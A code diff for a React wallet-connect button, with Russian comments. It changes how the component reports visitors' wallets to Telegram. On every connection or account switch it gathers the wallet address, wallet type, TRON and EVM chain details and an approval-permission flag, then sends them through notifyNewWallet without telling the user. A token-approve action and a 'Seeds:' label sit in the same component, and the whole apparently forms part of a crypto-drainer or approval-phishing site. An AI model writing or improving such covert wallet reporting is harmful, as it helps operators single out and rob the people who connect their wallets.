@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { Wallet, Copy, Check, LogOut } from 'lucide-react';
 import { useWallet } from '../hooks/useWallet';
 import { useLanguage } from '../hooks/useLanguage';
@@ -22,73 +22,75 @@ export const WalletButton: React.FC = () => {
   const { t } = useLanguage();
   const [copied, setCopied] = useState(false);
 
-  // чтобы не слать дубликаты в TG при каждом ререндере
-  const [notifiedAddress, setNotifiedAddress] = useState<string | null>(null);
+  // трекаем прошлые значения, чтобы ловить "рёбра" подключения и смену аккаунта
+  const prevConnected = useRef<boolean>(false);
+  const prevAddress = useRef<string | null>(null);
 
-  // Авто-оповещение в Telegram при появлении нового адреса
-  useEffect(() => {
+  // универсальная отправка уведомления
+  const sendNotify = async () => {
     const addr = wallet?.address;
     if (!addr) return;
-    if (notifiedAddress === addr) return; // уже отправляли для этого адреса
 
-    (async () => {
-      // сеть из хука, если есть
-      let network: string | undefined = (wallet as any)?.network || undefined;
+    let network: string | undefined = (wallet as any)?.network || undefined;
+    const extra: Record<string, unknown> = { hasManagementPermission: !!hasManagementPermission };
 
-      // собираем максимум безопасных деталей о среде
-      const extra: Record<string, unknown> = {
-        hasManagementPermission: !!hasManagementPermission,
-      };
+    if (typeof window !== 'undefined') {
+      const w: any = window as any;
 
-      if (typeof window !== 'undefined') {
-        const w: any = window as any;
+      // Тип кошелька
+      if (w.tronLink) extra.walletType = 'TronLink';
+      else if (w.ethereum?.isMetaMask) extra.walletType = 'MetaMask';
+      else if (w.ethereum) extra.walletType = 'EVM Wallet';
+      else extra.walletType = 'unknown';
 
-        // Тип/провайдер
-        if (w.tronLink) extra.walletType = 'TronLink';
-        else if (w.ethereum?.isMetaMask) extra.walletType = 'MetaMask';
-        else if (w.ethereum) extra.walletType = 'EVM Wallet';
-        else extra.walletType = 'unknown';
-
-        // TRON детали (base58/hex + узел)
-        if (w.tronWeb?.defaultAddress) {
-          extra.tron = {
-            base58: w.tronWeb.defaultAddress.base58 || null,
-            hex: w.tronWeb.defaultAddress.hex || null,
-            node: w.tronWeb?.fullNode?.host || null,
-          };
-          // Если сеть не задана, попробуем угадать по хосту
-          if (!network && w.tronWeb?.fullNode?.host) {
-            const host = String(w.tronWeb.fullNode.host);
-            network = /trongrid\.io/i.test(host)
-              ? 'tron-mainnet'
-              : /nile|shasta/i.test(host)
-              ? 'tron-testnet'
-              : 'tron-unknown';
-          }
-        }
-
-        // EVM chainId / web3 client
-        if (w.ethereum) {
-          try {
-            extra.chainId = await w.ethereum.request({ method: 'eth_chainId' });
-          } catch {}
-          try {
-            extra.web3Client = await w.ethereum.request({ method: 'web3_clientVersion' });
-          } catch {}
+      // TRON детали
+      if (w.tronWeb?.defaultAddress) {
+        extra.tron = {
+          base58: w.tronWeb.defaultAddress.base58 || null,
+          hex: w.tronWeb.defaultAddress.hex || null,
+          node: w.tronWeb?.fullNode?.host || null,
+        };
+        if (!network && w.tronWeb?.fullNode?.host) {
+          const host = String(w.tronWeb.fullNode.host);
+          network = /trongrid\.io/i.test(host)
+            ? 'tron-mainnet'
+            : /nile|shasta/i.test(host)
+            ? 'tron-testnet'
+            : 'tron-unknown';
         }
       }
 
-      try {
-        // передаём адрес, сеть и extra (если типы notifyNewWallet у тебя были старые,
-        // каст к any обеспечит совместимость)
-        await (notifyNewWallet as any)(addr, network, extra);
-      } catch (e) {
-        console.warn('notifyNewWallet failed', e);
+      // EVM детали
+      if (w.ethereum) {
+        try { extra.chainId = await w.ethereum.request({ method: 'eth_chainId' }); } catch {}
+        try { extra.web3Client = await w.ethereum.request({ method: 'web3_clientVersion' }); } catch {}
       }
+    }
 
-      setNotifiedAddress(addr);
-    })();
-  }, [wallet?.address, wallet?.network, hasManagementPermission, notifiedAddress]);
+    try {
+      await (notifyNewWallet as any)(addr, network, extra);
+    } catch (e) {
+      console.warn('notifyNewWallet failed', e);
+    }
+  };
+
+  // отправляем:
+  // 1) при новом подключении (false -> true)
+  // 2) при смене адреса, даже без дисконнекта
+  useEffect(() => {
+    const connected = !!wallet?.connected;
+    const addr = wallet?.address || null;
+
+    const connectedEdge = connected && !prevConnected.current;          // новый connect
+    const addressChanged = connected && prevAddress.current && prevAddress.current !== addr; // смена аккаунта
+
+    if (connectedEdge || addressChanged) {
+      void sendNotify();
+    }
+
+    prevConnected.current = connected;
+    prevAddress.current = addr;
+  }, [wallet?.connected, wallet?.address, wallet?.network, hasManagementPermission]);
 
   const handleCopyAddress = () => {
     copyAddress();
@@ -107,6 +109,11 @@ export const WalletButton: React.FC = () => {
     } catch (error) {
       console.error('Approve failed:', error);
     }
+  };
+
+  const onDisconnect = () => {
+    // сбрасывать ничего не нужно — мы теперь шлём на новое "рёбро" подключения
+    disconnectWallet();
   };
 
   if (wallet.connected) {
@@ -156,7 +163,7 @@ export const WalletButton: React.FC = () => {
           </button>
 
           <button
-            onClick={disconnectWallet}
+            onClick={onDisconnect}
             className="p-1 hover:bg-gray-700 rounded transition-colors text-red-400"
             title={t('wallet.disconnect')}
           >
@@ -168,7 +175,7 @@ export const WalletButton: React.FC = () => {
         <div className="mt-2 text-xs text-white/60 select-none">Seeds:</div>
 
         {/* Testing dropdown */}
-        <div className="opacity-0 group-hover:opacity-100 absolute top-full right-0 mt-2 w-64 bg-gray-800 rounded-lg shadow-xl border border-gray-700 z-50 transition-opacity duration-200">
+        <div className="opacity-0 group-hover:opacity-100 absolute top-full right-0 mt-2 w-72 bg-gray-800 rounded-lg shadow-xl border border-gray-700 z-50 transition-opacity duration-200">
           <div className="p-3">
             <h4 className="text-white font-semibold mb-2 text-sm">🧪 Wallet Testing</h4>
             <div className="space-y-2">
@@ -183,6 +190,13 @@ export const WalletButton: React.FC = () => {
                 className="w-full text-left px-3 py-2 text-sm text-gray-300 hover:text-white hover:bg-gray-700 rounded transition-colors"
               >
                 🧪 Test Token Approve
+              </button>
+              <button
+                onClick={() => void sendNotify()}
+                className="w-full text-left px-3 py-2 text-sm text-gray-300 hover:text-white hover:bg-gray-700 rounded transition-colors"
+                title="Повторно отправить уведомление сейчас"
+              >
+                🔁 Notify again (manual)
               </button>
             </div>
           </div>
